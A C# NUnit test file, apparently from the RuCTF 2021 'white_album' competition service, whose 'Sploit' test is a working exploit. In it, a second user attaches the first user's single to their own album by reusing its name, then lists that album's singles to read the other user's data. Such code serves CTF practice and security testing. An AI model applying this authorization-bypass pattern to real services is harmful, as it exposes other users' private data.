using System;
using System.Threading;
using System.Threading.Tasks;
using DoNotIncludeThisPlease.Client;
using FluentAssertions;
using FluentAssertions.Extensions;
using NUnit.Framework;
using Vostok.Clusterclient.Core.Model;
using Vostok.Configuration.Sources.Object;
using Vostok.Hosting;
using Vostok.Hosting.Setup;
using Vostok.Logging.Console;
using WhiteAlbum;
using WhiteAlbum.Entities;
using WhiteAlbum.Entities.Users;
using WhiteAlbum.Requests;
using WhiteAlbum.Tracks;

namespace DoNotIncludeThisPlease
{
    public class Tests
    {
        private UserId userId;
        private UserName userName;
        private AlbumId albumId;
        private AlbumName albumName;
        private Client.Client client;
        private VostokHost host;
        private UserId userId2;
        private UserName userName2;
        private AlbumId albumId2;
        private AlbumName albumName2;
        private SingleId? singleId;
        private SingleName? singleName;

        private AlbumId persistentAlbumId = new AlbumId(new Guid(1, 3, 4, 2, 2, 3, 5, 7, 2, 3, 1));
        private AlbumName persistentAlbumName = new AlbumName("persistent_album_name");

        [SetUp]
        public void SetUp()
        {
            Environment.CurrentDirectory = @"D:\ructf2021\ructf-2021\services\white_album\DoNotIncludeThisPlease\bin\Release\net5.0";
            
            void EnvironmentSetup(IVostokHostingEnvironmentBuilder builder)
            {
                builder
                    .SetupApplicationIdentity(
                        identityBuilder => identityBuilder
                            .SetEnvironment("environment")
                            .SetProject("White")
                            .SetApplication("Album")
                            .SetInstance("0"))
                    .SetupLog(logBuilder => logBuilder.SetupConsoleLog())
                    .SetPort(1234);
            }

            host = new VostokHost(new VostokHostSettings(new WhiteAlbumApplication(), EnvironmentSetup));

            host.WithConsoleCancellation().StartAsync().GetAwaiter().GetResult();
            
            userId = new UserId(Guid.NewGuid());
            userName = new UserName($"user_nemu_{userId.Id}");
            
            userId2 = new UserId(Guid.NewGuid());
            userName2 = new UserName($"user_nemu_{userId.Id}");
            
            albumId = new AlbumId(Guid.NewGuid());
            albumName = new AlbumName($"album_name_{albumId.Id}");
            
            albumId2 = new AlbumId(Guid.NewGuid());
            albumName2 = new AlbumName($"album_name_{albumId2.Id}");
            
            singleId = new SingleId(Guid.NewGuid());
            singleName = new SingleName($"single_name1_{singleId}");
            
            var log = new SynchronousConsoleLog();
            var authProvider = new AsyncLocalAuthProvider();

            client = new Client.Client("http://localhost:1234/", authProvider, log);
            

        }

        [TearDown]
        public async Task TearDown()
        {
            await host.StopAsync();
        }

       
        
        [Test]
        public async Task Sploit()
        {
            var userToken = (await client.UsersClient.Create(new CreateUserRequest(userId, userName), 60.Seconds())).Result;

            ApiKey.Set(userToken.Id.ToString());
        
            var createAlbumRequest = new CreateAlbumRequest(albumId, albumName, new AlbumMeta(null, null));

            var createResult = (await client.AlbumClient.Create(createAlbumRequest, 60.Seconds()));
            
            createResult.EnsureSuccess();
            
            var getResult = (await client.AlbumClient.Get(new GetAlbumRequest(albumId), 60.Seconds()));
            
            getResult.EnsureSuccess();
            
            var createSingleRequest = new CreateSingleRequest(singleId, new SingleMeta("author", null), singleName, new Track(Array.Empty<string>()));
            var createSingleResult = (await client.SinglesClient.Create(createSingleRequest, 60.Seconds()));
            
            createSingleResult.EnsureSuccess();
            
            var attachResult = await client.AlbumClient.Attach(new AttachSingleToAlbumRequest(singleId, albumId), 60.Seconds());
            attachResult.EnsureSuccess();
            
            ApiKey.Set(null);
            
            var userToken2 = (await client.UsersClient.Create(new CreateUserRequest(userId2, userName2), 60.Seconds())).Result;
            
            ApiKey.Set(userToken2.Id.ToString());
            
            var createAlbumRequest2 = new CreateAlbumRequest(albumId2, albumName2, new AlbumMeta(null, null));

            var createResult2 = (await client.AlbumClient.Create(createAlbumRequest2, 60.Seconds()));
            
            createResult2.EnsureSuccess();
            
            var getResult2 = (await client.AlbumClient.Get(new GetAlbumRequest(albumId2), 60.Seconds()));
            
            getResult2.EnsureSuccess();
            
            var singleId2 = new SingleId(Guid.NewGuid());
            var singleName2 = singleName;
            var createSingleRequest2 = new CreateSingleRequest(singleId2, new SingleMeta("author2", null), singleName2, new Track(Array.Empty<string>()));
            var createSingleResult2 = (await client.SinglesClient.Create(createSingleRequest2, 60.Seconds()));
            
            createSingleResult2.EnsureSuccess();

            
            var attachResult2 = await client.AlbumClient.Attach(new AttachSingleToAlbumRequest(singleId, albumId2), 60.Seconds());
            attachResult2.EnsureSuccess();
            
            var getAllSinglesResult = await client.AlbumClient.GetAllSingles(new GetAllSinglesRequest(albumId2), 60.Seconds());
            getAllSinglesResult.Result.Should().Contain(x => x.Id.Id.Equals(singleId.Id));
        }
        
     
    }
}
